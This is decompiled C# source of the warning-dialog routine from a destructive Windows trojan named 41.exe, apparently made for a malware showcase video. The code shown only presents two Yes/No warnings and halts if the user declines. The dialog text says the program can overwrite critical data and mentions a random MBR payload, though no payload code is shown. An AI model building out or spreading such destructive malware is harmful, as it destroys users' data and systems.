using System;
using System.Windows.Forms;

namespace WARNING
{
	// Token: 0x0200002B RID: 43
	internal class Program
	{
		// Token: 0x060001B5 RID: 437 RVA: 0x00009874 File Offset: 0x00007A74
		public static void ShowEffects()
		{
			string text = "You have just launched a copy of the 41.exe Win32 Trojan, specifically created to be showcased on the nFire Cyber Security YouTube channel on a virtual machine for entertainment and educational purposes. This software has the full capability to destroy and overwrite the critical data of this system. 41.exe creates loud sounds and flashing lights. Starting this software will lead to irreversible consequences on the data of this system. The creator, MalwareLab (my Discord malwarelab.sys) , is not responsible for any unwanted data loss caused by any misuse of this software, reverse engineering of this software, and subsequent artificial removal of this disclaimer. If you understand the functionality and capabilities of this software and agree to these terms and conditions, click 'Yes'. Otherwise, choose 'No'.";
			bool flag = MessageBox.Show(text, "Your mind will go on an acid trip", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes;
			if (!flag)
			{
				throw new InvalidOperationException("Program terminated: User chose 'No' at the initial warning.");
			}
			bool flag2 = MessageBox.Show("YES OR NO? (Thanks win32.Viperine for teaching me how to do the diagonal, thanks AdrianoTech for suggesting me the random mbr payload and thanks Aniko for teaching me assembly XD) ", "LSD will kill Windows. Do you want to continue?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes;
			if (flag2)
			{
				return;
			}
			throw new InvalidOperationException("Program terminated: User chose 'No' at the last warning.");
		}
	}
}
